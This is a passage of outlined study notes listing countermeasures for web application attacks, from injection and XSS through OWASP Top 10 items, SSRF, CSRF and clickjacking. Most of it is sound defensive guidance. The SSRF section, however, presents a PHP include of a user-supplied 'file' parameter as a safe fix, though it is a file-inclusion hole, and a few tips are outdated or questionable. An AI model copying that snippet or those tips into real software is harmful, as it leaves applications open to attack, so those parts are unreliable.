			- Use secure methods for file path construction, avoiding direct concatenation of user input.
			- Apply the principle of least privilege to restrict access to files and directories.
			- Implement file size limits on both client and server sides to prevent DoS attacks.
			- Scan uploaded files with antivirus or anti-malware solutions before processing.
			- Employ a Web Application Firewall (WAF) to monitor and block file injection attempts.
			- Use Content Security Policy (CSP) headers to mitigate XSS risks that could lead to file injection.
			- Check for PHP wrappers (e.g., php://filter, zip://) to prevent access to sensitive files.
			- For PHP applications:
				- Disable allow_url_fopen and allow_url_include in php.ini.
				- Disable register_globals and enable E_STRICT for error detection.
				- Vet all file and stream functions (stream_*).
			- Consider chroot jail implementation to isolate the file system.
			- Use a separate database for storing file paths with unique identifiers to prevent MITM attacks.
		- Defending Against Server-Side JavaScript (JS) Injection:
			- Server-side JS injection allows attackers to execute arbitrary JavaScript code on the server, leading to security breaches. To mitigate these risks, follow these countermeasures:
			- Strictly validate and sanitize user input to remove or escape dangerous characters (e.g., <, >, &, |, ;).
			- Avoid using eval() and similar functions (setTimeout(), setInterval(), Function()). Use JSON.parse() instead of eval() for JSON parsing.
			- Use strict mode ("use strict") to enforce safer JavaScript execution.
			- Restrict user input to short, alphanumeric strings when applicable.
			- Avoid code serialization to prevent execution of unintended JavaScript.
			- Use context-sensitive escaping in template engines to prevent injection attacks.
			- Execute user-supplied code in a sandboxed environment isolated from the server and sensitive data.
			- Use parameterized queries or prepared statements to prevent JavaScript injection in SQL queries.
			- Implement Content Security Policy (CSP) headers to restrict script execution sources.
			- Escape and encode data properly before inserting it into JavaScript contexts.
			- Use secure libraries and built-in functions to escape characters that might break out of intended contexts.
			- Disable or limit dangerous features such as inline scripts or dynamic code evaluation in the server-side environment.
		- Defending Against Server-Side Include (SSI) Injection:
			- SSI injection allows attackers to execute unauthorized server-side commands by injecting malicious directives. To prevent these attacks, follow these countermeasures:
			- Validate and sanitize user input, ensuring it does not contain SSI directive characters (e.g., <!--#).
			- Apply HTML encoding to user input before rendering it on web pages.
			- Restrict SSI directives to only necessary and trusted parts of the application.
			- Avoid using pages with .stm, .shtm, and .shtml extensions to reduce exposure.
			- Configure the server to disallow SSI in user-controlled content and inputs.
			- Use SUExec to execute pages with the file owner's permissions.
			- Modify the global access.conf file by setting OPTIONS IncludesNOEXEC to restrict SSI execution in directories.
			- Properly escape or remove special characters that could trigger SSI directives.
		- Defending Against Server-Side Template Injection (SSTI):
			- SSTI attacks occur when user input is improperly handled within a template engine, allowing attackers to execute arbitrary code. To mitigate this risk, follow these countermeasures:
			- Never create templates from user input or pass user input directly into templates.
			- Use template engines that automatically escape user inputs and enforce security features (e.g., Jinja2 for Python, Handlebars for JavaScript, Thymeleaf for Java).
			- Execute templates in a sandboxed environment with restricted execution capabilities (e.g., SandboxedEnvironment in Jinja2).
			- Disable or restrict dynamic code execution in the template engine if not required.
			- Ensure dynamic data is passed using built-in template engine functions rather than direct concatenation.
			- Properly escape and contextually encode user inputs before including them in templates (e.g., HTML, JavaScript, URL encoding).
			- Harden template engine configurations by disabling features that allow arbitrary code execution.
			- Use predefined payloads and built-in expressions to periodically test for vulnerabilities.
			- Prefer static template files whenever possible to reduce attack vectors.
			- Review the template engine’s security documentation and apply best practices for hardening.
		- Defending Against Log Injection:
			- Log injection attacks manipulate log entries to mislead administrators or hide malicious activity. To mitigate these risks, follow these countermeasures:
			- Use structured logging formats (e.g., JSON, XML) to reduce the risk of injection.
			- Pass log codes instead of raw messages and avoid including sensitive or user-controlled input in logs.
			- Validate and sanitize inputs on both the client and server sides to remove harmful characters.
			- Use logging libraries with built-in mechanisms for escaping and sanitization (e.g., Log4j for Java, Winston for Node.js, Python's logging module).
			- Restrict access to log files using file permissions, ACLs, and cryptographic protections.
			- Implement log rotation to manage file sizes and securely archive old logs.
			- Encrypt log files or sensitive log messages to prevent unauthorized access.
			- Monitor logs continuously for anomalies, tampering, or suspicious entries.
			- Separate legitimate and fake logs by prefixing entries with metadata.
			- Use centralized logging solutions to aggregate logs and provide a unified security overview.
			- Prevent API logging of sensitive actions to reduce visibility in browser network calls.
			- Implement cryptographic checksums or hashes to verify log integrity.
			- Avoid viewing logs with tools that interpret control characters, preventing unintended execution.
			- Scan for log injection vulnerabilities using static analysis tools.
			- Detect and block malicious patterns (e.g., script tags, SQL code) with regular expressions.
		- Defending Against HTML Injection:
			- HTML injection occurs when untrusted user input is improperly handled, allowing attackers to manipulate web content. To mitigate this risk, follow these countermeasures:
			- Validate and sanitize user inputs to remove or escape potentially dangerous characters (e.g., <, >, &, ", ').
			- Encode and validate user outputs alongside inputs to maintain a complete validation process.
			- Use security libraries for input sanitization (e.g., OWASP Java HTML Sanitizer, DOMPurify for JavaScript).
			- Enable the HttpOnly flag on cookies to prevent client-side access to sensitive session data.
			- Use template engines that automatically escape user inputs (e.g., Handlebars for JavaScript, Thymeleaf for Java, Jinja2 for Python).
			- Avoid direct HTML generation with user inputs; use safe DOM manipulation techniques (.text() instead of .html() in jQuery).
			- Educate developers and security teams on HTML injection risks and preventive measures.
			- Enforce strict MIME type checking on the web server to prevent unintended file interpretation.
			- Employ security solutions to detect injections while minimizing false positives.
		- CRLF Injection Prevention:
			- Encode or sanitize CRLF special characters to prevent injection.
			- Remove %0d, %0a, \r, and \n from user input before using it in HTTP headers.
			- Update the programming language or framework to one that restricts CRLF injection.
			- Avoid directly using user input in HTTP headers; validate and sanitize necessary data.
			- Use secure APIs and libraries that handle HTTP responses properly.
			- Configure security measures such as XSSUrlFilter to prevent CRLF injection.
			- Disable unnecessary headers.
			- Escape CRLF characters in logs, HTTP headers, or any context where they could be misused.
			- Use web frameworks with built-in security features, such as Django (Python) and Spring (Java).
			- Ensure user inputs conform to expected formats using whitelisting and validation.
			- Utilize tools like HtmlCleaner to remove script tags and mitigate injection risks.
		- XSS Attack Prevention:
			- Cross-Site Scripting (XSS) exploits input validation flaws in web applications, allowing attackers to embed malicious scripts. To mitigate XSS risks:
			- Input Validation & Encoding
				- Validate all user inputs (headers, cookies, query strings, form fields) against strict specifications.
				- Encode non-alphanumeric characters before displaying user input.
				- Use context-appropriate encoding (e.g., HTML entity encoding, JavaScript escaping, URL encoding, CSS escaping).
				- Escape untrusted data in HTML output to prevent Reflected and Stored XSS.
			- Security Policies & Frameworks
				- Implement Content Security Policy (CSP) to prevent malicious script execution.
				- Use secure frameworks that handle escaping (e.g., Django, Ruby on Rails, React).
				- Enforce a positive security policy defining allowed inputs instead of relying on attack signatures.
				- Avoid inline JavaScript, inline event handlers, and eval().
			- Testing & Code Review
				- Conduct security code reviews to identify XSS vulnerabilities.
				- Use automated Vulnerability Assessment and Penetration Testing (VAPT) tools during development.
				- Utilize scanning tools like Nessus and Nikto to detect flaws.
			- Additional Defenses
				- Use Web Application Firewalls (WAFs) and anti-XSS filters to block malicious scripts.
				- Limit input field sizes to prevent long script injections.
				- Deploy Public Key Infrastructure (PKI) for authentication.
				- Secure session management using session IDs and timestamps to prevent unauthorized access.
				- Utilize safe DOM manipulation techniques instead of directly injecting user input.
				- Prefer browsers with built-in XSS filtering.
	- Web Application Attack Countermeasures:
		- Broken Access Control:
			- Perform access-control checks before redirecting users to requested resources.
			- Use secure, unpredictable IDs to prevent guessing attacks.
			- Implement session timeout mechanisms and invalidate session tokens on logout.
			- Enforce role-based (RBAC) and attribute-based (ABAC) access controls.
			- Grant users only the minimum privileges necessary.
			- Apply the "deny by default" principle, except for public resources.
			- Restrict file permissions and prevent metadata or backup files in web roots.
			- Remove client-side caching of sensitive data.
			- Ensure access control mechanisms are consistent and reused across the application.
			- Log and monitor unauthorized access attempts.
			- Conduct regular access control audits and security tests.
			- Rely only on server-side authentication for consistency and security.
			- Limit cross-origin resource sharing (CORS) and apply security headers like CSP and X-Frame-Options.
			- Implement multi-factor authentication (MFA) for sensitive resources.
		- Cryptographic Failures / Sensitive Data Exposure Countermeasures:
			- Use strong encryption algorithms (AES-256 for symmetric, RSA-2048 for asymmetric) and authenticated encryption for data confidentiality and integrity.
			- Encrypt sensitive data in transit using TLS with Perfect Forward Secrecy (PFS) and enforce HSTS (HTTP Strict Transport Security).
			- Store cryptographic keys securely using Hardware Security Modules (HSMs) or Key Management Services (KMS), and rotate them regularly.
			- Implement PCI DSS-compliant tokenization or truncation to limit data exposure.
			- Use strong, one-way hashing algorithms (bcrypt, scrypt, Argon2) for password storage.
			- Avoid weak or outdated cryptographic algorithms (e.g., MD5, SHA-1, PKCS v1, PKCS v1.5).
			- Disable caching for requests containing sensitive information and prevent auto-filling for highly sensitive forms.
			- Classify data and apply appropriate security controls based on sensitivity.
			- Use encrypted databases and built-in database encryption features (e.g., MySQL, PostgreSQL, SQL Server).
			- Avoid excessive data exposure through APIs by restricting unnecessary JSON payloads.
			- Ensure cryptographic libraries and frameworks are up-to-date to mitigate known vulnerabilities.
			- Employ a Web Application Firewall (WAF) with data masking and custom security rules.
		- Insecure Design Countermeasures:
			- Threat Modeling
				- Implement threat modeling early in the design phase to identify potential threats and vulnerabilities.
				- Conduct periodic assessments for new modules and features.
				- Use tools like Microsoft Threat Modeling Tool or OWASP Threat Dragon.
				- Design tests for flow validation and verification.
			- Security Requirements & Secure Design
				- Define clear security requirements based on industry standards and integrate them into design specifications.
				- Follow secure design principles:
					- Least privilege – Limit user and process permissions.
					- Defense in depth – Implement multiple layers of security controls.
					- Fail securely – Ensure systems remain secure even in failure scenarios.
					- Secure by default – Use security-first default settings.
					- Minimize attack surface – Reduce entry points and attack vectors.
			- Secure Development Lifecycle (SDLC)
				- Integrate security into every phase of development, from planning to maintenance.
				- Maintain strong collaboration between development and security teams.
				- Use established frameworks like Microsoft's SDL or OWASP SAMM.
			- Architectural Risk Analysis
				- Conduct architectural risk analysis, including attack surface evaluation and threat assessments.
			- Additional Measures
				- Regularly assess application reliability and security throughout development.
				- Implement layered security controls from the network to the system level.
				- Enforce role-based access controls (RBAC) and categorize users based on authorization levels.
				- Identify attack vectors using security controls and business risk profiling.
				- Follow well-established security patterns and best practices from sources like OWASP Security Knowledge Framework and SEI CERT Coding Standards.
		- Security Misconfiguration:
			- Security misconfiguration makes web applications vulnerable, potentially granting attackers access to files, sensitive data, and application controls. Insufficient transport layer protection can lead to unauthorized access, account theft, phishing, and admin compromise. Encrypt all communications between the website and clients to mitigate these risks.
			- Countermeasures:
				- Configure all security mechanisms properly and disable unused services.
				- Set up roles, permissions, and accounts; disable or change default credentials.
				- Regularly scan for vulnerabilities and apply security patches.
				- Redirect non-SSL requests to SSL pages and enforce encryption on all connections, including backend systems.
				- Use only strong SSL/TLS algorithms, ensure certificates are valid, and match all site domains.
				- Set the ‘secure’ flag on sensitive cookies.
				- Use unique credentials for development, testing, and production environments.
				- Minimize unnecessary features, components, and frameworks.
				- Segment application architecture for independent security of components and tenants.
				- Automate configuration checks to ensure security settings remain effective.
				- Apply the principle of least privilege (PoLP) for applications and systems.
				- Isolate development, testing, and production environments.
				- Implement network segmentation to separate sensitive systems from less secure areas.
				- Restrict management interface access (e.g., admin panels) to trusted IPs and enforce multi-factor authentication (MFA) with strong passwords.
				- Use configuration management tools (e.g., Ansible, Puppet, Chef) for secure, consistent configurations.
				- Maintain version control for configuration files to track changes.
				- Follow security hardening standards such as CIS Benchmarks and NIST guidelines.
		- XML External Entity (XXE) Attacks:
			- To prevent XXE attacks, securely configure XML parsers and restrict external entity processing.
			- Countermeasures:
				- Use a securely configured XML parser; disable external entity processing.
				- Configure the XML processor to use local static DTD and disable declared DTDs in XML documents.
				- Validate XML input using whitelisting, input validation, sanitization, and filtering techniques.
				- Ensure XML/XLS file uploads are validated using XSD.
				- Use secure libraries and parsers with XXE protection enabled by default.
				- Regularly update XML processors, libraries, and application dependencies.
				- Limit XML document size, entity depth, and complexity to prevent denial-of-service attacks.
				- Deploy security tools such as API security gateways, IAST tools, and WAFs to detect and block XXE attacks.
				- Implement logging and monitoring for XML parsing activities to detect anomalies.
				- Use application server instrumentation (ASI) to monitor execution flow at runtime.
				- Perform regular security audits and code reviews to identify and fix potential vulnerabilities.
		- Vulnerable and Outdated Components"
			- Using outdated or vulnerable components can expose applications to security risks. To mitigate this, implement strict dependency and patch management practices.
			- Countermeasures:
				- Regularly check and maintain an inventory of all client-side and server-side components, including dependencies.
				- Continuously monitor sources like the National Vulnerability Database (NVD) for security issues.
				- Use dependency management tools (e.g., npm, pip, Maven, Composer) to track and update dependencies automatically.
				- Apply security patches promptly and implement a robust patch management process.
				- Scan components frequently with security scanners and software composition analysis (SCA) tools (e.g., OWASP Dependency-Check, Snyk, Black Duck, WhiteSource).
				- Remove unnecessary dependencies, components, and files.
				- Obtain components only from official, trusted, and verified repositories, accepting only signed packages.
				- Ensure subcomponents are also updated along with main components.
				- Use security wrappers to safeguard vulnerable components.
				- Follow semantic versioning to track updates and ensure compatibility.
				- Manage code and dependencies using version control systems like Git.
				- Isolate third-party components in containers or sandboxes (e.g., Docker) to minimize security risks.
				- Configure components with the least privileges necessary to reduce attack impact.
		- Identification and Authentication Failures:
			- Flaws in authentication and session management can allow attackers to steal credentials, session tokens, or exploit vulnerabilities to impersonate users.
			- Countermeasures:
				- Use SSL/TLS for all authenticated parts of the application.
				- Store user credentials securely using strong cryptographic hashing algorithms (e.g., bcrypt, scrypt, Argon2).
				- Implement identity and access management (IAM) and enforce strong password policies.
				- Require passphrases with at least five random words and check passwords against a list of common weak passwords.
				- Implement multi-factor authentication (MFA) to prevent brute-force, credential stuffing, and guessing attacks.
				- Limit login attempts and lock accounts temporarily after multiple failed attempts.
				- Use rate limiting and CAPTCHA to prevent automated login attacks.
				- Ensure secure session management, using long, random session identifiers and invalidating sessions after logout.
				- Avoid storing or exposing session IDs in URLs to prevent session hijacking.
				- Enhance security for API gateways, credential recovery, and registration to prevent enumeration attacks.
				- Use standard authentication protocols such as OAuth 2.0 and OpenID Connect.
				- Secure password reset mechanisms with unique, time-limited tokens sent to registered emails.
				- Log and monitor authentication activities, including login attempts, account lockouts, and password changes.
				- Set up alerts for suspicious activity and potential security incidents.
		- Software and Data Integrity Failures:
			- Ensuring software and data integrity is crucial to preventing unauthorized modifications and supply-chain attacks.
			- Countermeasures:
				- Enforce digital signatures and integrity checks (e.g., checksums like SHA-256) for software, data, and updates.
				- Source libraries and dependencies (e.g., npm, Maven) only from trusted repositories.
				- Use supply-chain security tools (e.g., OWASP Dependency-Check, CycloneDX) to detect vulnerabilities.
				- Regularly audit code and configurations to prevent malicious code from entering the software pipeline.
				- Secure the CI/CD pipeline with proper isolation, access controls, and configuration management.
				- Implement automated verification of checksums before installation or execution.
				- Distribute software updates securely (e.g., via HTTPS) and ensure they are signed and verified.
				- Isolate the build environment from development and production for added security.
				- Use automated testing to detect unauthorized changes or vulnerabilities during the build process.
				- Enforce database integrity checks and constraints to maintain data consistency.
				- Maintain regular backups in secure storage and ensure integrity during restoration.
				- Implement zero-trust architecture to continuously verify software and data integrity.
				- Use micro-segmentation to protect critical data and systems from unauthorized access.
		- Insecure Deserialization:
			- Insecure deserialization can allow attackers to manipulate serialized objects, leading to remote code execution, data tampering, or privilege escalation.
			- Countermeasures:
				- Validate untrusted input before serialization to ensure only trusted classes are included.
				- Avoid serialization for security-sensitive classes and domain objects when possible.
				- Use safer data formats like JSON or XML instead of serialization/deserialization.
				- Filter and restrict deserialized data by implementing object whitelisting to allow only approved classes.
				- Use secure libraries and APIs that provide safe deserialization mechanisms (e.g., Kryo for Java).
				- Perform integrity checks or encrypt serialized objects to prevent tampering or hostile object creation.
				- Isolate deserialization processes in low-privileged environments to limit the impact of potential exploits.
				- Ensure deserialized classes do not contain dangerous methods (e.g., __wakeup, __destruct, __invoke in PHP).
				- Avoid executing code during object construction and deserialization.
				- Monitor and log deserialization activity, including unexpected failures and constant deserialization attempts.
				- Limit network access for systems performing deserialization to reduce exposure.
				- Use serialization frameworks with built-in security features.
				- Enforce security permissions and conduct security checks before and after serialization/deserialization.
		- Security Logging and Monitoring Failures:
			- Insufficient logging and monitoring can delay the detection of security incidents, increasing the risk of data breaches and system compromise.
			- Countermeasures:
				- Define logging scope to cover business-critical assets and high-value transactions.
				- Establish a logging baseline and enforce it across all assets.
				- Log all key events, including logins, access control failures, and input validation errors, with user context for traceability.
				- Sanitize log data to prevent log injection attacks.
				- Ensure audit trails with integrity controls (e.g., append-only database tables) to prevent tampering.
				- Use centralized logging systems (e.g., ELK Stack, Splunk, Graylog) to aggregate logs for better analysis.
				- Implement secure storage for logs with access controls, encryption, and backup policies.
				- Synchronize log timestamps across systems to maintain consistency in real-time analysis.
				- Monitor and analyze suspicious activities, including failed login attempts, abnormal system behavior, and partial failures (e.g., HTTP 403 errors).
				- Use AI-driven monitoring tools and IDS/IPS to detect anomalies and security threats.
				- Secure log transmission with encryption to prevent tampering or MITM attacks.
				- Implement log rotation and retention policies to manage log size and ensure availability for forensic analysis.
				- Enable real-time log monitoring to detect and respond to incidents promptly.
				- Correlate logs from multiple sources to identify patterns and potential security threats.
				- Develop and enforce a logging policy defining what events to log, how logs are managed, and who reviews them.
		- Server-Side Request Forgery (SSRF) Mitigation:
			- Validate and Sanitize Inputs: Strictly validate and sanitize user-provided URLs and IP addresses. Allow only those that match a predefined whitelist or pattern.
			- Restrict URL Schemes: Permit only required URL schemes (e.g., https://) and block unnecessary ones.
			- Prevent Raw Responses: Ensure no raw responses are sent to the client.
			- Disable Automatic Redirects: Configure HTTP clients to block automatic redirects for server-initiated requests.
			- Set Response Limits: Use appropriate headers to restrict response types and sizes, minimizing data exfiltration risks.
			- Ensure URL Stability: Mitigate DNS rebinding and time-of-check to time-of-use (TOCTOU) attacks.
			- Enforce Network Segmentation: Separate access to remote resources into distinct networks.
			- Restrict Intranet Access: Implement a "deny by default" policy or access-control rules to block all intranet traffic except essential traffic.
			- Enhance Frontend Security: Use VPNs and encryption techniques to secure frontend systems.
			- Whitelist Domains and IPs: Restrict outgoing requests to an approved list of trusted domains and IP ranges using strict patterns and regex.
			- Restrict File Access: Allow only authorized file extensions by hard-coding the permitted ones (e.g., <?php include($_GET['file'] . '.html'); ?>).
			- Monitor and Log Changes: Track server modifications and file changes.
			- Enforce Web Application Firewalls (WAFs): Deploy next-generation WAFs to detect and block SSRF attempts.
			- Block Suspicious Requests: Reject requests containing internal IP addresses (e.g., 127.0.0.1, 169.254.0.0/16, 192.168.0.0/16).
			- Use API Gateways: Manage and secure outgoing requests to ensure compliance with security policies.
			- Proxy External Requests: Route all external requests through a proxy server to inspect and enforce security rules.
			- Leverage Service Mesh: Implement a service mesh to secure server-to-server communication with controlled request handling.
		- Directory Traversal Mitigation:
			- Directory traversal attacks exploit vulnerabilities in web applications to access restricted directories and execute commands outside the web server’s root directory. To prevent such attacks, developers must enforce strict file and directory access controls.
			- Countermeasures:
				- Enforce Access Controls: Define and restrict access rights to protected areas of the website.
				- Validate and Sanitize Input:
					- Only allow alphanumeric characters in user input.
					- Remove or encode traversal characters (.., /, \) to prevent unauthorized directory access.
					- Whitelist allowable file paths and directories, permitting access only to explicitly approved locations.
					- Ensure that resolved file paths remain within allowed directories before accessing them.
				- Normalize File Paths: Convert file paths to a canonical form, removing traversal sequences before processing.
				- Use Secure APIs:
					- Append application input to the base directory and use platform filesystem APIs for path resolution.
					- Avoid functions that allow arbitrary file access based on user input (e.g., eval, exec, open).
					- Use functions and libraries with built-in security features for handling file paths.
				- Secure File Management:
					- Host public and sensitive documents separately (e.g., on a separate file server or cloud storage).
					- Restrict file names to a safe character set and ensure file references adhere to these constraints.
					- Do not rely on user input for file-system API calls.
				- Apply Principle of Least Privilege:
					- Grant the application only the minimum necessary file and directory permissions.
					- Avoid running the application with elevated privileges.
				- Server and Configuration Security:
					- Keep web servers updated with security patches.
					- Disable directory listings to prevent attackers from viewing directory contents.
					- Use a chroot jail for Unix-based systems to restrict file system access.
					- Use a virtual file system to enforce access controls at a higher level.
		- Unvalidated Redirects and Forwards Mitigation:
			- Web applications often redirect or forward users to other pages, but if these actions are not properly validated, attackers can exploit them to redirect users to malicious sites or access unauthorized pages. To prevent such attacks, avoid allowing users to directly supply parameters for redirects and forwards in application logic.
			- Countermeasures:
				- Minimize Redirects and Forwards: Avoid using them whenever possible.
				- Use Static URLs: Prefer static URLs for redirects. If dynamic URLs are required, validate them against a whitelist of allowed destinations.
				- Validate Destination Parameters:
					- Ensure user-supplied values are authorized and valid.
					- Map input to predefined destinations using an enumeration or lookup table.
					- Do not accept full URLs as user input; instead, validate against a trusted list of hosts or regex patterns.
				- Secure Redirection Mechanisms:
					- Use absolute and relative URLs carefully to prevent open redirects.
					- Implement token-based verification for redirects.
					- Encode URL parameters to prevent injection of malicious code.
				- Restrict Search Engine Exploits: Remove redirect scripts from search engine indexing to prevent misuse.
				- Enhance User Awareness & UI Protections:
					- Implement pop-up notifications when redirecting users to external pages.
					- Educate users about phishing techniques and common URL spoofing methods.
				- Apply Internal Redirects with Filtering: Limit redirects to local subdomains to minimize risks.
				- Secure Links Opening in New Tabs: Use rel="noopener noreferrer" for external links to prevent access to window.opener.
		- Watering Hole Attack Mitigation:
			- A watering hole attack targets users by compromising frequently visited websites. To prevent such attacks, organizations should secure their infrastructure and educate users on safe browsing practices.
			- Countermeasures:
				- Keep Software Updated: Regularly apply patches to remove vulnerabilities.
				- Monitor and Analyze Traffic:
					- Continuously monitor network traffic for anomalies.
					- Analyze user behavior for suspicious activities.
					- Inspect popular websites for potential compromises.
				- Secure DNS and Web Access:
					- Harden the DNS server to prevent redirection to malicious sites.
					- Implement DNS Security Extensions (DNSSEC) to protect DNS integrity.
					- Use browser plugins to block HTTP redirects and prevent tracking.
					- Disable third-party content, such as advertising services, to reduce exposure to malicious scripts.
				- Enhance Browser and System Security:
					- Use a VPN and enable private browsing to hide online activities.
					- Run the browser in a virtual environment to limit local system access.
					- Utilize micro-virtualization to isolate web activity from critical system resources.
				- Restrict Web Permissions: Prevent users from granting unnecessary permissions to websites.
				- Deploy Web Filtering & Email Security:
					- Use web filters to detect and block access to compromised websites.
					- Employ an email security solution that applies dynamic malware analysis to detect targeted phishing attempts.
		- Cross-Site Request Forgery (CSRF) Mitigation:
			- A CSRF attack tricks a user’s browser into sending unauthorized requests to a legitimate web application using the user's authentication credentials. To prevent CSRF attacks, implement strong security measures at both the server and client levels.
			- Countermeasures:
				- Use CSRF Tokens:
					- Generate unique CSRF tokens for each user session and include them in forms and state-changing requests.
					- Validate the token on the server-side before processing requests.
					- Maintain a per-request token strategy instead of assigning tokens per session.
					- Send the CSRF token both as a cookie and a request parameter, ensuring they match on the server.
				- Secure Cookies and Headers:
					- Set cookies with the SameSite attribute to prevent cross-site requests.
					- Validate the Referer and Origin headers to ensure requests come from the intended source.
					- Use a custom header (e.g., X-Requested-With) for state-changing requests, as browsers prevent cross-origin sites from setting custom headers.
				- Restrict Request Methods:
					- Use GET, HEAD, and OPTIONS methods for safe operations that do not modify application state.
					- Restrict POST, PUT, DELETE, and PATCH methods for state-changing operations and protect them with CSRF tokens.
				- Enhance User Security Practices:
					- Enforce re-authentication or password confirmation for critical actions.
					- Do not allow browsers or websites to save login details.
					- Log out immediately after using a web application and clear browsing history.
				- Leverage Security Frameworks: Utilize frameworks such as Joomla, Spring, Struts, Ruby on Rails, and .NET, which have built-in CSRF protection.
		- Cookie/Session Poisoning Mitigation:
			- Cookie/session poisoning occurs when attackers modify cookie data to escalate privileges or manipulate user sessions. To prevent such attacks, developers should follow secure coding practices and implement robust session management techniques.
			- Countermeasures:
				- Secure Cookie Storage & Transmission:
					- Never store plaintext or weakly encrypted passwords in cookies.
					- Ensure cookies are transmitted only over HTTPS by setting the Secure attribute.
					- Prevent JavaScript access to cookie data by using the HttpOnly attribute.
					- Use the SameSite attribute to restrict cross-site cookie transmission.
					- Sign cookies with a server-side secret and verify their integrity before processing.
				- Enhance Session Security:
					- Use long, random session IDs to prevent guessing and prediction.
					- Regenerate session IDs upon login and periodically during the session to prevent session fixation.
					- Store session data on the server, referencing it with a session identifier rather than storing sensitive information in client-side cookies.
					- Enable synchronous session management for added security.
				- Restrict Cookie Behavior:
					- Set cookie timeouts to automatically expire sessions after inactivity.
					- Associate authentication credentials with an IP address to prevent session hijacking.
					- Restrict multipurpose cookies, ensuring each cookie serves only a single function.
				- User & Browser Protection:
					- Provide logout functions to allow users to terminate sessions securely.
					- Regularly clear stored cookies to prevent session persistence.
					- Use VPNs with high-grade encryption to prevent session sniffing.
					- Deploy virus and malware scanning software to protect against malicious scripts targeting cookies.
		- Web Service Attack Mitigation:
			- Web services are often targeted due to their exposure in business-to-business (B2B) applications. To defend against attacks, multiple layers of protection, strict authentication, and access controls should be implemented.
			- Countermeasures:
				- Input Validation & Schema Enforcement:
					- Validate all inputs against expected formats and types for XML and JSON.
					- Use strict XML and JSON schemas to prevent injection attacks.
					- Maintain and update a secure repository of XML schemas.
				- Authentication & Access Control:
					- Implement strong authentication using OAuth, JWT, API keys, or SAML.
					- Use Role-Based Access Control (RBAC) to restrict access to specific operations.
					- Use X.509 certificates, Kerberos tickets, or password digests in SOAP headers.
					- Enforce URL authorization to limit access to web service files (.asmx).
				- Firewall & Intrusion Detection:
					- Deploy web-service-capable firewalls to filter SOAP and ISAPI requests.
					- Configure firewalls and IDS/IPS systems to detect anomalies and filter improper SOAP and XML syntax.
				- SOAP & WSDL Security:
					- Restrict WSDL access permissions to prevent unauthorized discovery.
					- Disable dynamic WSDL generation to prevent exposure of service details.
					- Block external references in XML and use pre-fetched content instead.
					- Disable WS-Addressing unless strictly necessary, and create a whitelist of allowed addresses.
					- Use an XML proxy to hide internal configuration details from exposure.
				- SOAP Action & Message Security:
					- Disable the SOAPAction attribute when not required.
					- Avoid guessable SOAP Action terminologies (e.g., createUser, deleteUser).
					- Compare SOAPAction and SOAP body to detect inconsistencies.
					- Digitally sign SOAP messages to ensure integrity and authenticity.
				- Encryption & Secure Communication:
					- Use TLS to secure SOAP communication.
					- Ensure consistent encoding between client and server.
				- Additional Best Practices:
					- Implement XSLT for XML address translation in outgoing messages.
					- Verify caller’s endpoint in SOAP messages before processing them.
					- Ensure compliance with Web Services Interoperability (WS-I) standards.
		- Clickjacking Attack Prevention:
			- Use server-side methods like the X-Frame-Options header (DENY, SAMEORIGIN, ALLOW-FROM URI) and Content-Security-Policy (CSP) to prevent unauthorized framing.
			- Avoid client-side methods like Framebusting, as they are easily bypassed.
			- Mask the HTML document and reveal it only after confirming it is not framed.
			- Set the SameSite cookie attribute to prevent session cookies from being sent in embedded frames.
			- Regularly scan for vulnerabilities using a web security scanner.
			- Employ Auth0, which protects login pages with X-Frame-Options and CSP headers.
			- Implement UI defensive measures to ensure the page is the top-level window and detect UI manipulation attempts.
			- Use window.confirm() or other confirmation dialogs for critical user actions.
			- Recommend browser extensions like NoScript or uBlock Origin for additional protection.
		- JavaScript Hijacking Prevention:
			- Use .innerText instead of .innerHTML to prevent script injection.
			- Avoid eval() and similar functions that introduce vulnerabilities.
			- Do not manually write serialization code; use an encoding library to protect attributes and data elements.
			- Use SSL/TLS for secure communication and encrypt data on the server-side rather than in client-side code.
			- Build XML using frameworks instead of constructing it manually.
			- Return JSON objects in a structured format (e.g., { "result": [{ "object": "inside array" }] }) and avoid exposing sensitive data.
			- Maintain unique session-based URLs for JSON object retrieval.
			- Monitor JavaScript activity with AI-based tools to detect malicious behavior.
			- Conduct tree-based lifecycle analysis of JavaScript libraries to detect unauthorized modifications.
			- Enable Subresource Integrity (SRI) to prevent unauthorized JavaScript modifications.
			- Use JavaScript analyzers to identify client-side vulnerabilities.
			- Implement CSRF tokens to verify the legitimacy of JSON requests.
			- Ensure the server processes only requests with the correct Content-Type header.
			- Avoid JSONP for cross-domain requests; use CORS instead.
			- Prefix JSON responses with a non-executable string (e.g., )]}',\n) to prevent hijacking.
			- Use CORS headers to control domain access to JSON endpoints.
			- Parse JSON data safely, avoiding the use of eval().
			- Require API keys or tokens to authenticate API requests and restrict access to authorized clients.
		- Username Enumeration Prevention:
			- Display only generic error messages for invalid user identifiers (e.g., “Invalid username or password”).
			- Use non-sequential, complex usernames (e.g., randomly generated usernames) to prevent enumeration.
			- Implement CAPTCHA on input fields to prevent automated data collection.
			- Apply rate limiting to block repeated failed login attempts from the same IP address.
			- Use a Web Application Firewall (WAF) to detect and block suspicious activity, including multiple enumeration attempts.
			- Prevent SQL injection and XSS attacks to stop user enumeration through dumped data.
			- Mask usernames on the "Forgot Password" page and during registration to avoid revealing existing accounts.
			- Avoid disclosing whether a username is already registered when users attempt to sign up.
			- Maintain uniform response times for both valid and invalid login attempts to prevent timing attacks.
			- Add slight delays to authentication responses to further mitigate brute-force attempts.
			- Use email addresses as login identifiers instead of usernames, as they are harder to enumerate.
			- Implement geo-restrictions to verify login attempts based on the user's location.
			- Harden services to prevent null binds and unauthorized root access.
			- Implement honeypots with dummy accounts or fields to detect malicious activity.
			- Apply two-factor authentication (2FA) or response padding techniques to further secure login attempts.
		- Securing the Password Reset Mechanism:
			- Validate the random token and email link before processing the request.
			- Ensure password reset URLs are single-use and have a short expiration time.
			- Use HTTPS for all password reset URLs.
			- Implement CAPTCHA to prevent automated reset attempts.
			- Restrict request frequency per IP or device to mitigate abuse.
			- Use MFA techniques to secure password reset processes.
			- Generate cryptographically secure tokens for each reset request.
			- Send temporary passwords via registered email instead of directly resetting passwords.
			- Require user confirmation via a code sent to their email or phone before completing the reset.
		- Preventing Same-Site Attacks:
			- Use unique CSRF tokens for each session and validate them on the server before processing requests.
			- Set the SameSite attribute for cookies to prevent cross-site request forgery (CSRF).
			- Validate the Referer and Origin headers to ensure requests originate from the same site.
			- Regularly update and verify DNS records to prevent misconfigurations and security risks.
			- Implement DNS misconfiguration checks and educate users on the risks of improper CNAME DNS entries.
			- Use user interaction methods like re-authentication and CAPTCHA to prevent automated attacks.
	- Defend Against Web Application Attacks:
